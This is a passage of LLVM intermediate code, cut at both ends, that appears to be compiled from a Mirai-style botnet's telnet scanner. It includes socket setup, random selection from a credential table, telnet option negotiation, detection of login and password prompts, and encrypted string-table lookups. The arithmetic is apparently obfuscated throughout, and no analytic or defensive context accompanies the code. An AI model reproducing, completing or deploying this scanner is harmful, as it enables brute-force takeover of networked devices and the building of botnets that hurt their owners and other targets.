  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %62

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = and i32 2048, %33
  %35 = xor i32 2048, %33
  %36 = or i32 %34, %35
  %37 = or i32 2048, %33
  %38 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %36)
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %39, align 4
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 4
  %42 = load i32, i32* %41, align 4
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %44 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %43, i32 0, i32 0
  store i32 %42, i32* %44, align 4
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 5
  %47 = load i16, i16* %46, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  %49 = load i32, i32* @fake_time, align 4
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 2
  store i32 %49, i32* %51, align 4
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 3
  store i32 1, i32* %53, align 8
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %55 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i32 0, i32 1
  %56 = load i32, i32* %55, align 8
  %57 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %58 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %58, %struct.sockaddr** %57, align 8
  %59 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %60 = load %struct.sockaddr*, %struct.sockaddr** %59, align 8
  %61 = call i32 @connect(i32 %56, %struct.sockaddr* %60, i32 16)
  br label %62

; <label>:62:                                     ; preds = %21, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set.18*, %struct.fd_set.18*, %struct.fd_set.18*, %struct.timeval.19*) #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %50

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %51

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = sub i32 0, %44
  %46 = sub i32 0, 1
  %47 = add i32 %45, %46
  %48 = sub i32 0, %47
  %49 = add nsw i32 %44, 1
  store i32 %48, i32* %2, align 4
  br label %9

; <label>:50:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %51

; <label>:51:                                     ; preds = %50, %36
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %52
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %46

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %45

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add i32 %40, -880329876
  %42 = add i32 %41, 1
  %43 = sub i32 %42, -880329876
  %44 = add nsw i32 %40, 1
  store i32 %43, i32* %10, align 4
  br label %21

; <label>:45:                                     ; preds = %21
  br label %46

; <label>:46:                                     ; preds = %45, %4
  %47 = load i32, i32* %9, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %149, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %150

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %150

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %148

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %150

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %48

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = add i32 %43, -1817881586
  %45 = add i32 %44, 2
  %46 = sub i32 %45, -1817881586
  %47 = add nsw i32 %43, 2
  store i32 %46, i32* %3, align 4
  br label %11

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 253
  br i1 %53, label %54, label %88

; <label>:54:                                     ; preds = %48
  %55 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %56 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %56, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = load i8*, i8** %4, align 8
  %59 = call signext i8 @can_consume(%struct.scanner_connection* %57, i8* %58, i32 2)
  %60 = icmp ne i8 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %54
  br label %150

; <label>:62:                                     ; preds = %54
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 2
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp ne i32 %66, 31
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  br label %89

; <label>:69:                                     ; preds = %62
  %70 = load i8*, i8** %4, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 3
  store i8* %71, i8** %4, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 3
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 3
  store i32 %76, i32* %3, align 4
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 1
  %80 = load i32, i32* %79, align 8
  %81 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %82 = call i64 @send(i32 %80, i8* %81, i64 3, i32 16384)
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 1
  %85 = load i32, i32* %84, align 8
  %86 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %87 = call i64 @send(i32 %85, i8* %86, i64 9, i32 16384)
  br label %146

; <label>:88:                                     ; preds = %48
  br label %89

; <label>:89:                                     ; preds = %88, %68
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %91 = load i8*, i8** %4, align 8
  %92 = call signext i8 @can_consume(%struct.scanner_connection* %90, i8* %91, i32 2)
  %93 = icmp ne i8 %92, 0
  br i1 %93, label %95, label %94

; <label>:94:                                     ; preds = %89
  br label %150

; <label>:95:                                     ; preds = %89
  store i32 0, i32* %5, align 4
  br label %96

; <label>:96:                                     ; preds = %127, %95
  %97 = load i32, i32* %5, align 4
  %98 = icmp slt i32 %97, 3
  br i1 %98, label %99, label %132

; <label>:99:                                     ; preds = %96
  %100 = load i8*, i8** %4, align 8
  %101 = load i32, i32* %5, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 253
  br i1 %106, label %107, label %112

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %4, align 8
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8, i8* %108, i64 %110
  store i8 -4, i8* %111, align 1
  br label %126

; <label>:112:                                    ; preds = %99
  %113 = load i8*, i8** %4, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 251
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %4, align 8
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %121, i64 %123
  store i8 -3, i8* %124, align 1
  br label %125

; <label>:125:                                    ; preds = %120, %112
  br label %126

; <label>:126:                                    ; preds = %125, %107
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = load i32, i32* %5, align 4
  %129 = sub i32 0, 1
  %130 = sub i32 %128, %129
  %131 = add nsw i32 %128, 1
  store i32 %130, i32* %5, align 4
  br label %96

; <label>:132:                                    ; preds = %96
  %133 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %134 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 8
  %136 = load i8*, i8** %4, align 8
  %137 = call i64 @send(i32 %135, i8* %136, i64 3, i32 16384)
  %138 = load i8*, i8** %4, align 8
  %139 = getelementptr inbounds i8, i8* %138, i64 3
  store i8* %139, i8** %4, align 8
  %140 = load i32, i32* %3, align 4
  %141 = sub i32 0, %140
  %142 = sub i32 0, 3
  %143 = add i32 %141, %142
  %144 = sub i32 0, %143
  %145 = add nsw i32 %140, 3
  store i32 %144, i32* %3, align 4
  br label %146

; <label>:146:                                    ; preds = %132, %69
  br label %147

; <label>:147:                                    ; preds = %146
  br label %148

; <label>:148:                                    ; preds = %147, %23
  br label %149

; <label>:149:                                    ; preds = %148
  br label %11

; <label>:150:                                    ; preds = %94, %61, %33, %22, %11
  %151 = load i32, i32* %3, align 4
  ret i32 %151
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = add i32 %13, 1250588144
  %15 = sub i32 %14, 1
  %16 = sub i32 %15, 1250588144
  %17 = sub nsw i32 %13, 1
  store i32 %16, i32* %5, align 4
  br label %18

; <label>:18:                                     ; preds = %73, %1
  %19 = load i32, i32* %5, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %80

; <label>:21:                                     ; preds = %18
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %23, i64 0, i64 %25
  %27 = load i8, i8* %26, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp eq i32 %28, 58
  br i1 %29, label %66, label %30

; <label>:30:                                     ; preds = %21
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = load i32, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 62
  br i1 %38, label %66, label %39

; <label>:39:                                     ; preds = %30
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 36
  br i1 %47, label %66, label %48

; <label>:48:                                     ; preds = %39
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 35
  br i1 %56, label %66, label %57

; <label>:57:                                     ; preds = %48
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 37
  br i1 %65, label %66, label %72

; <label>:66:                                     ; preds = %57, %48, %39, %30, %21
  %67 = load i32, i32* %5, align 4
  %68 = sub i32 %67, -899832887
  %69 = add i32 %68, 1
  %70 = add i32 %69, -899832887
  %71 = add nsw i32 %67, 1
  store i32 %70, i32* %6, align 4
  br label %80

; <label>:72:                                     ; preds = %57
  br label %73

; <label>:73:                                     ; preds = %72
  %74 = load i32, i32* %5, align 4
  %75 = sub i32 0, %74
  %76 = sub i32 0, -1
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, -1
  store i32 %78, i32* %5, align 4
  br label %18

; <label>:80:                                     ; preds = %66, %18
  %81 = load i32, i32* %6, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %123

; <label>:83:                                     ; preds = %80
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %84 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %84, i8** %9, align 8
  %85 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %85, i8** %10, align 8
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 7
  %88 = getelementptr inbounds [256 x i8], [256 x i8]* %87, i32 0, i32 0
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %89, i32 0, i32 6
  %91 = load i32, i32* %90, align 4
  %92 = load i8*, i8** %9, align 8
  %93 = load i32, i32* %8, align 4
  %94 = sub i32 %93, 957549659
  %95 = sub i32 %94, 1
  %96 = add i32 %95, 957549659
  %97 = sub nsw i32 %93, 1
  %98 = call i32 @util_memsearch(i8* %88, i32 %91, i8* %92, i32 %96)
  %99 = icmp ne i32 %98, -1
  %100 = zext i1 %99 to i32
  store i32 %100, i32* %7, align 4
  br i1 %99, label %101, label %103

; <label>:101:                                    ; preds = %83
  %102 = load i32, i32* %7, align 4
  store i32 %102, i32* %6, align 4
  br label %122

; <label>:103:                                    ; preds = %83
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 7
  %106 = getelementptr inbounds [256 x i8], [256 x i8]* %105, i32 0, i32 0
  %107 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %107, i32 0, i32 6
  %109 = load i32, i32* %108, align 4
  %110 = load i8*, i8** %10, align 8
  %111 = load i32, i32* %8, align 4
  %112 = sub i32 %111, 830166464
  %113 = sub i32 %112, 1
  %114 = add i32 %113, 830166464
  %115 = sub nsw i32 %111, 1
  %116 = call i32 @util_memsearch(i8* %106, i32 %109, i8* %110, i32 %114)
  %117 = icmp ne i32 %116, -1
  %118 = zext i1 %117 to i32
  store i32 %118, i32* %7, align 4
  br i1 %117, label %119, label %121

; <label>:119:                                    ; preds = %103
  %120 = load i32, i32* %7, align 4
  store i32 %120, i32* %6, align 4
  br label %121

; <label>:121:                                    ; preds = %119, %103
  br label %122

; <label>:122:                                    ; preds = %121, %101
  br label %123

; <label>:123:                                    ; preds = %122, %80
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %124 = load i32, i32* %6, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %123
  store i32 0, i32* %2, align 4
  br label %129

; <label>:127:                                    ; preds = %123
  %128 = load i32, i32* %6, align 4
  store i32 %128, i32* %2, align 4
  br label %129

; <label>:129:                                    ; preds = %127, %126
  %130 = load i32, i32* %2, align 4
  ret i32 %130
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub nsw i32 %12, 1
  store i32 %14, i32* %5, align 4
  br label %16

; <label>:16:                                     ; preds = %62, %1
  %17 = load i32, i32* %5, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %68

; <label>:19:                                     ; preds = %16
  %20 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %20, i32 0, i32 7
  %22 = load i32, i32* %5, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds [256 x i8], [256 x i8]* %21, i64 0, i64 %23
  %25 = load i8, i8* %24, align 1
  %26 = sext i8 %25 to i32
  %27 = icmp eq i32 %26, 58
  br i1 %27, label %55, label %28

; <label>:28:                                     ; preds = %19
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %30 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %29, i32 0, i32 7
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 62
  br i1 %36, label %55, label %37

; <label>:37:                                     ; preds = %28
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 7
  %40 = load i32, i32* %5, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [256 x i8], [256 x i8]* %39, i64 0, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 36
  br i1 %45, label %55, label %46

; <label>:46:                                     ; preds = %37
  %47 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %48 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %47, i32 0, i32 7
  %49 = load i32, i32* %5, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds [256 x i8], [256 x i8]* %48, i64 0, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = sext i8 %52 to i32
  %54 = icmp eq i32 %53, 35
  br i1 %54, label %55, label %61

; <label>:55:                                     ; preds = %46, %37, %28, %19
  %56 = load i32, i32* %5, align 4
  %57 = sub i32 %56, 939766657
  %58 = add i32 %57, 1
  %59 = add i32 %58, 939766657
  %60 = add nsw i32 %56, 1
  store i32 %59, i32* %6, align 4
  br label %68

; <label>:61:                                     ; preds = %46
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = sub i32 %63, 813090627
  %65 = add i32 %64, -1
  %66 = add i32 %65, 813090627
  %67 = add nsw i32 %63, -1
  store i32 %66, i32* %5, align 4
  br label %16

; <label>:68:                                     ; preds = %55, %16
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %91

; <label>:71:                                     ; preds = %68
  call void @table_unlock_val(i8 zeroext 25)
  %72 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %72, i8** %7, align 8
  %73 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %74 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %73, i32 0, i32 7
  %75 = getelementptr inbounds [256 x i8], [256 x i8]* %74, i32 0, i32 0
